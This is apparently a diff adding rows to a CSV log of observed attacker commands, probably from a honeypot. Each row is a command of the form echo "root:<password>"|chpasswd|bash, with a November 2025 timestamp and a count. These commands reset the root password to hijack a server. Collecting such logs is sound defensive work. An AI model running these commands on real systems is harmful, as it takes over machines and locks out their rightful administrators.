+"echo ""root:JEXZKLHssWOD""|chpasswd|bash",16/11/2025 00:00,1
+"echo ""root:JJn0DtdIQ5SB""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:JRECP7Pvymxq""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:JX8IekmHUzUT""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:JXcazcAmXnWR""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:JYqRActZLZ2h""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:Jk7d7LFfGJkJ""|chpasswd|bash",29/11/2025 00:00,1
+"echo ""root:JkXhxZUtNJAB""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:JogHwXh47tBo""|chpasswd|bash",28/11/2025 00:00,1
+"echo ""root:JrZDtVspXc1m""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:K5J6EBNmZpmC""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:K9cpdkTdT9Wn""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:K9rdhaM2vQgR""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:KJvN93CdftIu""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:KPJDrL5TnbVN""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:KRnY9oUwj4ox""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:KjFh7RyVQCyq""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:KjZDAWx7kYoZ""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:KqjSljbF6JrN""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:Kx5yJjMLDczi""|chpasswd|bash",16/11/2025 00:00,1
+"echo ""root:L0hBIaSL7Hm4""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:L8N9nbi3Xya3""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:LHtV2qzPZWNW""|chpasswd|bash",24/11/2025 00:00,1
+"echo ""root:LJKyIBsFkLCS""|chpasswd|bash",26/11/2025 00:00,1
+"echo ""root:LJrmmQJmfghv""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:LhwRWh52uAgx""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:Lj9hg3hAmyEb""|chpasswd|bash",18/11/2025 00:00,1
+"echo ""root:Lsxgi9lfZRpA""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:M7Drk8vwQlAc""|chpasswd|bash",24/11/2025 00:00,1
+"echo ""root:M9iQEWH5JiYQ""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:MMLdd9rsfOTd""|chpasswd|bash",26/11/2025 00:00,1
+"echo ""root:MUdUtEeUIJPl""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:MeYFbuG8TzeG""|chpasswd|bash",20/11/2025 12:00,1
+"echo ""root:MgWlF9nmoW2g""|chpasswd|bash",21/11/2025 12:00,1
+"echo ""root:MymWXhoIjGOp""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:N0Nb6g2iG5Xl""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:N3fGWqjiszKY""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:NDujsXUrUicP""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:NG3RwBxtca2r""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:NiKQRkHY1XxC""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:NjXC8ULvUeDT""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:NtqQBHXw5Frx""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:NzDv4PXIzT3m""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:NzHeaEXuOzxh""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:O1P5DYrZEXRO""|chpasswd|bash",15/11/2025 00:00,1
+"echo ""root:O3Z0rnE3edTr""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:O79FGs4r2XuM""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:ODtcQeEvBuLG""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:OIY9aWWQVqz1""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:OPaQyeErZYF3""|chpasswd|bash",25/11/2025 00:00,1
+"echo ""root:OPtj7QStvA5N""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:OfOsyVzpKD34""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:OfrVEY6eSJkm""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:Om7UW8nGcVo3""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:On2hQB07Ujgm""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:OusK5rmd3xk1""|chpasswd|bash",15/11/2025 00:00,1
+"echo ""root:P38qrNPJjsEB""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:PDGVdNf7Ldsz""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:PQ9l2oBAO3wV""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:PYBV0bRhojfD""|chpasswd|bash",26/11/2025 00:00,1
+"echo ""root:PYjdDv9gVl12""|chpasswd|bash",16/11/2025 00:00,1
+"echo ""root:PjmmkWC1KkL1""|chpasswd|bash",15/11/2025 00:00,1
+"echo ""root:Pzn1BXjTSCCb""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:Q2KrWiIspjLe""|chpasswd|bash",21/11/2025 12:00,1
+"echo ""root:Q4Kzmn9njZis""|chpasswd|bash",16/11/2025 00:00,1
+"echo ""root:QLvSBFwIAIAg""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:QOnwg8jyFiC0""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:QdCor6FbNksW""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:QdMASLTB4O1M""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:QkjoSDQM4zRo""|chpasswd|bash",25/11/2025 00:00,1
+"echo ""root:Qv5xwJgyEj4j""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:R5IOjqtbtYhk""|chpasswd|bash",17/11/2025 12:00,1
+"echo ""root:R7BQNxiVXdvS""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:R9OgSkhIbgkM""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:RFSTiB2Ly9wo""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:RIGMlsOzL9V2""|chpasswd|bash",26/11/2025 00:00,1
+"echo ""root:RT1cKQkn1vEK""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:RYv5DJh6U5GH""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:RbdCsXd5Zo3F""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:RiJUp3RYeXuh""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:RtTDM7xB93tC""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:SEBC71oAG1si""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:SMowGrCJQLc3""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:SU1zQucEOVRf""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:SbTeTDBfpQ2b""|chpasswd|bash",15/11/2025 00:00,1
+"echo ""root:SjDPEMDaZN3f""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:Sl2IKPDfVQj2""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:SojCamBe94j2""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:Stv4XrHzXoIE""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:T4oZjp5vWhqN""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:TJTgmtWXZ1LQ""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:TR9iy0PNFmAz""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:Tejv57hodXjJ""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:ThqPs24kRU8j""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:TmCkglrrMUeV""|chpasswd|bash",20/11/2025 12:00,1
+"echo ""root:Tu8McdLZfqe9""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:U5w23ae9i0xS""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:U8diGJWsbP9q""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:U9ochVMfI5pi""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:UMRWdB0L37tG""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:USGeAIkNCuoe""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:USSk5WNDzDgB""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:Upy2oX1Jikpm""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:UtCn0Pk8kwHG""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:V2Hw8ZKzFn6J""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:V6m63VuMDcHv""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:VEprIvqjmT17""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:VFnLKt6m6T25""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:VGdrVzKCmpsK""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:VagoWUr3e31V""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:VzJCaXpfbCLi""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:W3VQdZyCdcYp""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:WA4ebyoLYBc4""|chpasswd|bash",18/11/2025 00:00,1
+"echo ""root:WCPcDdamFlTc""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:WDVIhp99BaVw""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:WRBdCYsRQt2k""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:WSk5F2RJy0xc""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:WhqOtdjvMfhZ""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:Xl8GcrhYkSBr""|chpasswd|bash",17/11/2025 12:00,1
+"echo ""root:XtRPOVl2W4TH""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:Y4Y2J9xMOQnk""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:Y9zQyUXcQtI3""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:YBXzuSEdJU7t""|chpasswd|bash",24/11/2025 00:00,1
+"echo ""root:YLzl9cHSHenp""|chpasswd|bash",15/11/2025 00:00,1
+"echo ""root:YTtl4mWMhJD6""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:Yg5g0Vx75K8P""|chpasswd|bash",15/11/2025 00:00,1
+"echo ""root:YssggUUoJQcr""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:Yx9PU8eeKfIv""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:ZDtpwK91SYI2""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:ZJ2zxssiAagb""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:ZJYOVSrjHyC4""|chpasswd|bash",19/11/2025 12:00,1
+"echo ""root:ZQeR4uFybi91""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:ZfABa3SIxiWt""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:ZgrlnpEed83Y""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:ZhnmNBhs03kk""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:ZzJZraoNSoqi""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:a1DKiq0p2OYp""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:a9gcjH3EvoQO""|chpasswd|bash",27/11/2025 00:00,1
+"echo ""root:aAKnOeNIyRmv""|chpasswd|bash",20/11/2025 12:00,1
+"echo ""root:aIYWoPLVTnAC""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:aKWlHeVs9J5a""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:aUbkgudP1cT8""|chpasswd|bash",18/11/2025 00:00,1
+"echo ""root:af1z7Aprwy5T""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:b01nh5LoatrY""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:bHhKGTMuTKGH""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:bNS1QcHdcnsr""|chpasswd|bash",27/11/2025 00:00,1
+"echo ""root:bVo9q8CMJSEB""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:bWBVGHGjF7KP""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:bXUu3oHGHGf7""|chpasswd|bash",29/11/2025 00:00,1
+"echo ""root:bYz0UX8QYZ8L""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:baAKWtHvQ2ta""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:baDHjn62cDB4""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:bbTYh3mRK1GP""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:bfHmyTKRBB8L""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:bmG5tadOT7WE""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:c0Nd7qSWo6CI""|chpasswd|bash",24/11/2025 00:00,1
+"echo ""root:c56N0yEcN5WU""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:cIt6USvvmzfX""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:cJg2lIl6dP5K""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:cNWwmgLKDiK5""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:ckENJAdNjKou""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:cnAA4LY0XSzL""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:csvWhcSPxkLl""|chpasswd|bash",15/11/2025 00:00,1
+"echo ""root:cygBaxnDIug4""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:d03lxdcJWPJi""|chpasswd|bash",29/11/2025 00:00,1
+"echo ""root:d53lSWAh8YIv""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:e0W6LseP1mmz""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:e4dIoF7Hkcbv""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:eOAaNArwkU6E""|chpasswd|bash",15/11/2025 00:00,1
+"echo ""root:eZyrMjtnBPGE""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:eqyDvYBcJMR5""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:exw0SoLTdPdb""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:fAjClxAuD4rw""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:fBBBQowdlwtf""|chpasswd|bash",20/11/2025 12:00,1
+"echo ""root:fIHb8fSBKXvo""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:fQ01uvHiMGzw""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:fVHyLlT368fc""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:fYLSV9gGWKLo""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:fdmlLHIH4VCx""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:fegaukswsOS3""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:ffCT05fVUpD2""|chpasswd|bash",18/11/2025 00:00,1
+"echo ""root:ffeqBJLF7xZp""|chpasswd|bash",16/11/2025 00:00,1
+"echo ""root:fiR8dVl314Qa""|chpasswd|bash",25/11/2025 00:00,1
+"echo ""root:frGwdQgILI5J""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:frfM8udStiVi""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:g2om6zMM0w7s""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:g7oOJm1j9p7h""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:gCEOhPUd9OSC""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:gFhPi3jenSs4""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:gPlvaJO7ujrz""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:gRvCy19SXWxk""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:gqyzwkSEg00V""|chpasswd|bash",29/11/2025 00:00,1
+"echo ""root:gsQlkrk4UffJ""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:h2sYhUFso5J5""|chpasswd|bash",24/11/2025 00:00,1
+"echo ""root:hH2SnCzWlMJ3""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:hJiJrdvRunrq""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:hNT78DjtgMKt""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:hVBrPioXp3u5""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:hfw076AJGLsr""|chpasswd|bash",26/11/2025 00:00,1
+"echo ""root:hn1SFTRUs85h""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:htC6EyMdnoNo""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:hzAnFXSbKePY""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:iB48HoHOKLWE""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:iBFZ9dDheZXS""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:iNI7L98rvnAY""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:iui4htOEfdBe""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:jCLVqlAGuBBP""|chpasswd|bash",17/11/2025 12:00,1
+"echo ""root:jCxkdrtodWAY""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:jIccYxDnsSSC""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:jfei0yk6Y9wb""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:ji8Af7spqoNE""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:jneFpFwdXwfi""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:kCIh1ilDUK9x""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:kRhe5o48olcf""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:kVP4qPJiLeCl""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:kaQiGq6DEA3a""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:kbXiTBmsKCnk""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:kcEv5jk8ncnr""|chpasswd|bash",15/11/2025 00:00,1
+"echo ""root:kraqxXk6J9NQ""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:kui6eJmdZWq8""|chpasswd|bash",17/11/2025 12:00,1
+"echo ""root:l928CMXQeDd2""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:lG7kPoBW8fSe""|chpasswd|bash",16/11/2025 00:00,1
+"echo ""root:lKx9aJ9JfTLD""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:lNHF9ooY8S92""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:lfzeRlHm4cCN""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:lrGGqSdRWpjn""|chpasswd|bash",24/11/2025 00:00,1
+"echo ""root:mJmqdERCNvHT""|chpasswd|bash",29/11/2025 12:00,1
+"echo ""root:mL4vPSydCnSX""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:mRf1p1nSYFl7""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:mT3NDOnmCHEb""|chpasswd|bash",26/11/2025 00:00,1
+"echo ""root:n3Qvp5qaeL6P""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:n5OgacATetnZ""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:n9EWQRFtrJ8L""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:nP2zo96GTcQZ""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:npIn6LIuC6a3""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:nu7A6xxMW188""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:nxv9iYNljQTj""|chpasswd|bash",26/11/2025 12:00,1
+"echo ""root:o2Rg3ADFOFG7""|chpasswd|bash",26/11/2025 00:00,1
+"echo ""root:o9jU9kLkjW4q""|chpasswd|bash",25/11/2025 00:00,1
+"echo ""root:obGFRfktnhQY""|chpasswd|bash",26/11/2025 00:00,1
+"echo ""root:oebYSPf2bDyH""|chpasswd|bash",20/11/2025 12:00,1
+"echo ""root:ohJTAZ23LGMR""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:oxVtEEjmu5sA""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:pE1zLXpgy6j8""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:pPLMbxeFHfIW""|chpasswd|bash",29/11/2025 00:00,1
+"echo ""root:pRF19XR3aP9L""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:pYSs5deChX34""|chpasswd|bash",18/11/2025 00:00,1
+"echo ""root:peoQQ1nSapbk""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:pi73vA593dPS""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:pifLGjFoH8ls""|chpasswd|bash",29/11/2025 12:00,1
+"echo ""root:pruOQImKvG5j""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:ptPcQcHQyvTJ""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:pvI91P63wpFH""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:pvvtlemxpJmF""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:qCw8ebNkWfZg""|chpasswd|bash",28/11/2025 12:00,1
+"echo ""root:qD3wvjQmEvug""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:qDlUlNYDPM7f""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:qKilRWYDZO1n""|chpasswd|bash",18/11/2025 12:00,1
+"echo ""root:qOkyUTk01kkv""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:qP5JOcaB0Ywe""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:qUvqXlaUj5pC""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:qVPgM6iNFJ8t""|chpasswd|bash",27/11/2025 00:00,1
+"echo ""root:qWLxEjk1q3Cz""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:qaBIrEQxykoZ""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:qfMXOHQWeS4m""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:qrCEBJfJonoO""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:qzHQTKeX7oKq""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:r3Y49XA9c0hF""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:r8Rv3BxFrrKt""|chpasswd|bash",27/11/2025 00:00,1
+"echo ""root:r9mbBvL1LrED""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:rDO0wwW9nYOc""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:rFDjLrWWFxf0""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:rTvIfVgPyxtx""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:rVnpZLpmVhlZ""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:rlISZyHcmueR""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:rwGiQfTzMjXv""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:rwpVIoBdZ8v8""|chpasswd|bash",29/11/2025 00:00,1
+"echo ""root:sNlaWSSvYCjJ""|chpasswd|bash",27/11/2025 00:00,1
+"echo ""root:sPHadBLSAF3A""|chpasswd|bash",25/11/2025 00:00,1
+"echo ""root:sQTSGMjHbaqm""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:sc2BzFQCulEM""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:scMb4fRfj2CX""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:seaLrA08wj0T""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:slQKIJiAQv4z""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:sv38AzjpFv9b""|chpasswd|bash",23/11/2025 00:00,1
+"echo ""root:svosiBb1e1u1""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:t0Q6LhjI4kPT""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:t318c9QQxhGB""|chpasswd|bash",29/11/2025 00:00,1
+"echo ""root:tAl62IE6Ok4R""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:tLe4eXVPQe84""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:tSHoVPVVeSrv""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:tWWlhlnPaFQT""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:tjhl7So5Hw7h""|chpasswd|bash",24/11/2025 00:00,1
+"echo ""root:tjkYaPnB88q6""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:tslpl3n4DsfP""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:ttwoFLsZ4OLp""|chpasswd|bash",15/11/2025 00:00,1
+"echo ""root:u3WxcS6AWtRp""|chpasswd|bash",18/11/2025 00:00,1
+"echo ""root:uCFWeJgFgz6S""|chpasswd|bash",17/11/2025 12:00,1
+"echo ""root:uE8gSWw4UJFC""|chpasswd|bash",29/11/2025 12:00,1
+"echo ""root:uHxUFpteDhPu""|chpasswd|bash",26/11/2025 00:00,1
+"echo ""root:uIvh4xbYGZlA""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:uM0YgTefaxlF""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:uPNXI08oPyMM""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:uSsXcuxdrGf0""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:uU5VzESFx5zK""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:uW3IipNX0AG6""|chpasswd|bash",15/11/2025 00:00,1
+"echo ""root:uioopsXC5If9""|chpasswd|bash",15/11/2025 00:00,1
+"echo ""root:ulqq2jV7ew42""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:vbMmLZkznfoT""|chpasswd|bash",25/11/2025 00:00,1
+"echo ""root:vdGUgBwEavsk""|chpasswd|bash",29/11/2025 00:00,1
+"echo ""root:viJpqTQe5P3N""|chpasswd|bash",21/11/2025 00:00,1
+"echo ""root:viOPujApCiC9""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:vv4sRTtqqSEY""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:vxL8wbnpWy8d""|chpasswd|bash",22/11/2025 12:00,1
+"echo ""root:w30HsIjED7fV""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:wD4hgKRdZ6fO""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:wHuo6G8K2HcB""|chpasswd|bash",18/11/2025 00:00,1
+"echo ""root:wXLTVKkflQs2""|chpasswd|bash",19/11/2025 12:00,1
+"echo ""root:wYFds0SXKxNf""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:wmJZKS15F9bl""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:xG2OJqRO54j3""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:xNg7aFAWBdJX""|chpasswd|bash",17/11/2025 12:00,1
+"echo ""root:xaFZETwXnrvs""|chpasswd|bash",18/11/2025 00:00,1
+"echo ""root:xdEKfiTXStPT""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:xhSofMIqMCBo""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:xifDUyghfsfb""|chpasswd|bash",30/11/2025 00:00,1
+"echo ""root:y8FDYyWTKtUZ""|chpasswd|bash",19/11/2025 00:00,1
+"echo ""root:yMrEmBwyZbFT""|chpasswd|bash",22/11/2025 00:00,1
+"echo ""root:yete764vNBxT""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:yl09FJfgdGQs""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:ylDqAjixABbD""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:yqsVYGUpvsgK""|chpasswd|bash",17/11/2025 12:00,1
+"echo ""root:yxfI3WkEZBFd""|chpasswd|bash",27/11/2025 00:00,1
+"echo ""root:z2JHyILpZuhL""|chpasswd|bash",27/11/2025 00:00,1
+"echo ""root:z7YhX8qm5aZa""|chpasswd|bash",29/11/2025 00:00,1
+"echo ""root:z7nmiKiYvgW4""|chpasswd|bash",29/11/2025 00:00,1
+"echo ""root:z9gJEn3FuRqm""|chpasswd|bash",16/11/2025 00:00,1
+"echo ""root:zCtLWV46q6Fq""|chpasswd|bash",15/11/2025 12:00,1
+"echo ""root:zCvFRRsKULsD""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:zNbnILmFeg3z""|chpasswd|bash",20/11/2025 00:00,1
+"echo ""root:zatJ2yl8HCVW""|chpasswd|bash",25/11/2025 12:00,1
+"echo ""root:zgHzkeNORi8f""|chpasswd|bash",24/11/2025 00:00,1
+"echo ""root:zohjH1awdG4L""|chpasswd|bash",26/11/2025 00:00,1
+"echo ""root:zxVhHwWtT6xb""|chpasswd|bash",17/11/2025 12:00,1
